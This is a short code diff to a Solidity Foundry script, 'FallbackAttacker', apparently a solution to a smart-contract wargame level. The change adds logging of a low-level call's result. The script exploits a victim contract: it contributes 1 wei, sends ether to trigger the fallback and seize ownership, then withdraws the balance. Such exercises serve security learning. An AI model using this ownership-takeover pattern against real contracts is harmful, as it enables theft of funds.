@@ -2,7 +2,7 @@
 
 pragma solidity ^0.6.2;
 
-import {Script} from "forge-std/Script.sol";
+import {Script, console} from "forge-std/Script.sol";
 
 import {Constants} from "./Constants.s.sol";
 
@@ -24,8 +24,10 @@ contract FallbackAttacker is Constants, Script {
     // Must be external/public to be payable
     function attack(IFallback victim) public payable {
         victim.contribute{value: 1 wei}();
-        address(victim).call{value: 1 wei}("");
+        (bool success, ) = address(victim).call{value: 1 wei}("");
         victim.withdraw();
+
+        console.log("Success: ", success);
     }
 
     receive() external payable {}
